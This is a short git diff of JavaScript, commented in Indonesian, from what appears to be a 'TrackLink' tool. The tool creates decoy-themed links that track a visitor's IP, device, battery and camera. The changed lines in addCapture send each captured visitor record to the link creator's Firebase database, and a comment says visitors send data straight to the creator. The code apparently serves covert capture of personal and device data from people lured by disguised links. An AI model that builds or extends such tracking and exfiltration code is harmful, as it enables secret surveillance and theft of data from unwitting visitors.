@@ -106,7 +106,7 @@ export function createLink({ name, decoyTheme, trackIp, trackDevice, trackBatter
     id,
     decoyTheme: theme,
     options: { trackIp, trackDevice, trackBattery, trackCamera },
-    // Sertakan Firebase URL saja (aman jika Rules Firebase dikunci per link)
+    // Sertakan Firebase URL agar visitor bisa langsung kirim data ke DB creator
     notif: {
       tg: null,
       dc: null,
@@ -147,7 +147,7 @@ export async function addCapture(linkId, capture, notifOverride) {
   const linkName  = idx !== -1 ? links[idx].name : 'TrackLink';
 
   // ← KUNCI: tulis ke Firebase agar data visitor masuk ke dashboard creator
-  const fbUrl = settings.fb || settings.firebaseUrl;
+  const fbUrl = notifOverride?.fb || getSettings().firebaseUrl || getSettings().fb;
   if (fbUrl) {
     await writeToFirebase(fbUrl, linkId, captureWithMeta);
   }
